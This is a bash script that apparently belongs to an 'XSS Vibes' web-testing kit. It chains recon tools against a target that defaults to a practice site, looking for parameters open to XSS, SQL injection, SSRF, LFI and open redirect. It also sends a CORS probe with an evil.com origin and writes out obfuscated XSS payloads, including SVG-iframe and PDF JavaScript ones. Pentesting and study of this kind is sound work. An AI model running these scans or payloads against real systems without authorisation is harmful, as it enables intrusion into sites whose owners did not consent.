#!/bin/bash

# XSS Vibes - Quick Multi-Vulnerability Test Suite
# Tests all vulnerability types from the oneliners collection

echo "🔥 XSS Vibes - Quick Multi-Vuln Test"
echo "===================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Test target
TARGET=${1:-"testphp.vulnweb.com"}
TEST_DIR="quick_test_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$TEST_DIR"
cd "$TEST_DIR"

echo -e "${YELLOW}🎯 Testing target: $TARGET${NC}"
echo

# Test 1: XSS Detection
echo "1️⃣ XSS Detection Tests"
echo "========================"

echo "🕷️ Testing Gospider XSS..."
timeout 15 gospider -s "http://$TARGET" -c 3 -d 1 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | head -3 > xss_gospider.txt
echo "📊 Found $(wc -l < xss_gospider.txt) URLs with parameters"

echo "🏛️ Testing Wayback XSS..."
timeout 10 bash -c "echo $TARGET | waybackurls | grep '=' | head -5" > xss_wayback.txt
echo "📊 Found $(wc -l < xss_wayback.txt) wayback URLs with parameters"

echo "🌐 Testing GAU XSS..."
timeout 10 bash -c "echo $TARGET | gau | grep '=' | head -5" > xss_gau.txt
echo "📊 Found $(wc -l < xss_gau.txt) GAU URLs with parameters"

echo "🎯 Testing KXSS..."
timeout 10 bash -c "echo http://$TARGET/ | waybackurls | kxss | head -3" > xss_kxss.txt
echo "📊 Found $(wc -l < xss_kxss.txt) potential XSS parameters"

# Test 2: SQL Injection
echo
echo "2️⃣ SQL Injection Detection Tests"
echo "================================="

echo "🗃️ Testing SQL parameters..."
timeout 10 bash -c "echo $TARGET | gau | grep '=' | grep -E '(id|user|search|query|page|login)' | head -5" > sqli_params.txt
echo "📊 Found $(wc -l < sqli_params.txt) potential SQL injection parameters"

echo "🔍 Testing error-based SQLi indicators..."
timeout 10 bash -c "echo $TARGET | waybackurls | grep -E '(id=|user=|search=)' | head -3" > sqli_wayback.txt
echo "📊 Found $(wc -l < sqli_wayback.txt) wayback SQL parameters"

# Test 3: CORS Detection
echo
echo "3️⃣ CORS Misconfiguration Tests"
echo "==============================="

echo "🌐 Testing basic CORS..."
timeout 10 curl -s -I -H "Origin: https://evil.com" -X GET "http://$TARGET/" | grep -i "access-control" > cors_basic.txt
if [ -s cors_basic.txt ]; then
    echo -e "${GREEN}📊 Found CORS headers$(wc -l < cors_basic.txt)${NC}"
else
    echo "📊 No CORS headers found"
fi

echo "🔗 Testing API endpoints for CORS..."
timeout 10 bash -c "echo $TARGET | gau | grep -E '(api|cors|cross)' | head -3" > cors_api.txt
echo "📊 Found $(wc -l < cors_api.txt) potential API endpoints"

# Test 4: SSRF Detection
echo
echo "4️⃣ SSRF Detection Tests"
echo "======================="

echo "🔗 Testing SSRF parameters..."
timeout 10 bash -c "echo $TARGET | gau | grep '=' | grep -E '(url|uri|redirect|callback|api)' | head -5" > ssrf_params.txt
echo "📊 Found $(wc -l < ssrf_params.txt) potential SSRF parameters"

echo "🏛️ Testing wayback SSRF..."
timeout 10 bash -c "echo $TARGET | waybackurls | grep -E '(url=|uri=|redirect=)' | head -3" > ssrf_wayback.txt
echo "📊 Found $(wc -l < ssrf_wayback.txt) wayback SSRF parameters"

# Test 5: LFI Detection
echo
echo "5️⃣ LFI Detection Tests"
echo "======================"

echo "📁 Testing LFI parameters..."
timeout 10 bash -c "echo $TARGET | gau | grep '=' | grep -E '(file|path|include|page|doc)' | head -5" > lfi_params.txt
echo "📊 Found $(wc -l < lfi_params.txt) potential LFI parameters"

echo "🏛️ Testing wayback LFI..."
timeout 10 bash -c "echo $TARGET | waybackurls | grep -E '(file=|path=|include=)' | head -3" > lfi_wayback.txt
echo "📊 Found $(wc -l < lfi_wayback.txt) wayback LFI parameters"

# Test 6: Open Redirect
echo
echo "6️⃣ Open Redirect Tests"
echo "======================"

echo "🔄 Testing redirect parameters..."
timeout 10 bash -c "echo $TARGET | gau | grep -E '(redirect|url|next|return|goto)' | head -5" > redirect_params.txt
echo "📊 Found $(wc -l < redirect_params.txt) potential redirect parameters"

echo "🏛️ Testing wayback redirects..."
timeout 10 bash -c "echo $TARGET | waybackurls | grep -E '(redirect=|url=|next=)' | head -3" > redirect_wayback.txt
echo "📊 Found $(wc -l < redirect_wayback.txt) wayback redirect parameters"

# Test 7: Subdomain Enumeration
echo
echo "7️⃣ Subdomain Enumeration Tests"
echo "==============================="

echo "🔍 Testing subfinder..."
timeout 15 subfinder -d "$TARGET" -silent | head -5 > subdomains_subfinder.txt
echo "📊 Found $(wc -l < subdomains_subfinder.txt) subdomains via subfinder"

echo "🏗️ Testing assetfinder..."
timeout 10 bash -c "echo $TARGET | assetfinder -subs-only | head -5" > subdomains_assetfinder.txt
echo "📊 Found $(wc -l < subdomains_assetfinder.txt) subdomains via assetfinder"

# Test 8: Directory Discovery
echo
echo "8️⃣ Directory Discovery Tests"
echo "============================="

echo "🕷️ Testing gospider directories..."
timeout 15 gospider -s "http://$TARGET" -c 3 -d 1 | grep -E "(200|301|302)" | head -5 > dirs_gospider.txt
echo "📊 Found $(wc -l < dirs_gospider.txt) directories via gospider"

echo "🏛️ Testing wayback paths..."
timeout 10 bash -c "echo $TARGET | waybackurls | grep -o 'http[s]*://[^/]*[^?]*' | sort -u | head -5" > dirs_wayback.txt
echo "📊 Found $(wc -l < dirs_wayback.txt) unique paths via wayback"

# Test 9: GOD TIER Techniques
echo
echo "9️⃣ GOD TIER XSS Techniques Test"
echo "==============================="

echo "🏺 Testing Cuneiform XSS payload..."
echo "http://$TARGET/?test=𒀀='',𒉺=!𒀀+𒀀" > god_tier_cuneiform.txt
echo "✅ Cuneiform payload generated"

echo "👻 Testing Unicode Zero-Width payload..."
echo "http://$TARGET/?test=ale‌rt(1)" > god_tier_unicode.txt
echo "✅ Unicode zero-width payload generated"

echo "🔗 Testing Constructor Chain payload..."
echo "http://$TARGET/?test=constructor[constructor](alert(1))()" > god_tier_constructor.txt
echo "✅ Constructor chain payload generated"

echo "🎨 Testing SVG xlink:href payload..."
echo 'http://'"$TARGET"'/?test=<svg><use href="#x"></use><symbol id="x"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></symbol></svg>' > god_tier_svg.txt
echo "✅ SVG xlink:href payload generated"

echo "📄 Testing PDF XSS payload..."
echo "http://$TARGET/?test=%PDF-1.4%0A1%200%20obj%3C%3C/Type/Catalog/Pages%202%200%20R/OpenAction%3C%3C/Type/Action/S/JavaScript/JS(alert('XSS'))%3E%3E%3E%3E" > god_tier_pdf.txt
echo "✅ PDF XSS payload generated"

# Test 10: Tool Availability Check
echo
echo "🔟 Tool Availability Check"
echo "=========================="

tools=("subfinder" "httpx" "gospider" "waybackurls" "gau" "qsreplace" "dalfox" "kxss" "gf" "hakrawler" "anew" "uro" "nuclei" "curl")
available_tools=0
total_tools=${#tools[@]}

for tool in "${tools[@]}"; do
    if command -v "$tool" >/dev/null 2>&1; then
        echo -e "  ✅ $tool"
        ((available_tools++))
    else
        echo -e "  ❌ $tool"
    fi
done

echo -e "${YELLOW}🛠️ Tools available: $available_tools/$total_tools${NC}"

# Generate Summary Report
echo
echo "📊 COMPREHENSIVE TEST SUMMARY"
echo "=============================="
echo "Target: $TARGET"
echo "Test Date: $(date)"
echo "Test Directory: $PWD"
echo

echo "🎯 XSS Detection Results:"
echo "  - Gospider URLs: $(wc -l < xss_gospider.txt 2>/dev/null || echo 0)"
echo "  - Wayback URLs: $(wc -l < xss_wayback.txt 2>/dev/null || echo 0)"
echo "  - GAU URLs: $(wc -l < xss_gau.txt 2>/dev/null || echo 0)"
echo "  - KXSS Parameters: $(wc -l < xss_kxss.txt 2>/dev/null || echo 0)"

echo
echo "🗃️ SQL Injection Results:"
echo "  - SQL Parameters: $(wc -l < sqli_params.txt 2>/dev/null || echo 0)"
echo "  - Wayback SQL: $(wc -l < sqli_wayback.txt 2>/dev/null || echo 0)"

echo
echo "🌐 CORS Results:"
echo "  - CORS Headers: $(wc -l < cors_basic.txt 2>/dev/null || echo 0)"
echo "  - API Endpoints: $(wc -l < cors_api.txt 2>/dev/null || echo 0)"

echo
echo "🔗 SSRF Results:"
echo "  - SSRF Parameters: $(wc -l < ssrf_params.txt 2>/dev/null || echo 0)"
echo "  - Wayback SSRF: $(wc -l < ssrf_wayback.txt 2>/dev/null || echo 0)"

echo
echo "📁 LFI Results:"
echo "  - LFI Parameters: $(wc -l < lfi_params.txt 2>/dev/null || echo 0)"
echo "  - Wayback LFI: $(wc -l < lfi_wayback.txt 2>/dev/null || echo 0)"

echo
echo "🔄 Open Redirect Results:"
echo "  - Redirect Parameters: $(wc -l < redirect_params.txt 2>/dev/null || echo 0)"
echo "  - Wayback Redirects: $(wc -l < redirect_wayback.txt 2>/dev/null || echo 0)"

echo
echo "🏗️ Subdomain Results:"
echo "  - Subfinder: $(wc -l < subdomains_subfinder.txt 2>/dev/null || echo 0)"
echo "  - Assetfinder: $(wc -l < subdomains_assetfinder.txt 2>/dev/null || echo 0)"

echo
echo "📂 Directory Results:"
echo "  - Gospider Dirs: $(wc -l < dirs_gospider.txt 2>/dev/null || echo 0)"
echo "  - Wayback Paths: $(wc -l < dirs_wayback.txt 2>/dev/null || echo 0)"

echo
echo "🔥 GOD TIER Results:"
echo "  - All 5 advanced payloads generated ✅"

echo
echo "🛠️ Tool Status: $available_tools/$total_tools available"

# Calculate total findings
total_findings=0
for file in *.txt; do
    if [ -f "$file" ]; then
        lines=$(wc -l < "$file" 2>/dev/null || echo 0)
        total_findings=$((total_findings + lines))
    fi
done

echo
echo -e "${GREEN}🏆 TOTAL FINDINGS: $total_findings${NC}"
echo -e "${GREEN}✅ Multi-vulnerability test completed!${NC}"
echo -e "${YELLOW}📁 All results saved in: $PWD${NC}"

# Show top findings
echo
echo "🎯 Top Findings:"
echo "==============="

if [ -s xss_gospider.txt ]; then
    echo "🕷️ Top XSS URLs (Gospider):"
    head -3 xss_gospider.txt | sed 's/^/  /'
fi

if [ -s sqli_params.txt ]; then
    echo "🗃️ Top SQL Parameters:"
    head -3 sqli_params.txt | sed 's/^/  /'
fi

if [ -s subdomains_subfinder.txt ]; then
    echo "🏗️ Top Subdomains:"
    head -3 subdomains_subfinder.txt | sed 's/^/  /'
fi

echo
echo "💡 Next Steps:"
echo "============="
echo "1. Review findings in individual .txt files"
echo "2. Test GOD TIER payloads manually"
echo "3. Run targeted scans on interesting findings"
echo "4. Use advanced tools (dalfox, sqlmap) on confirmed vulnerabilities"
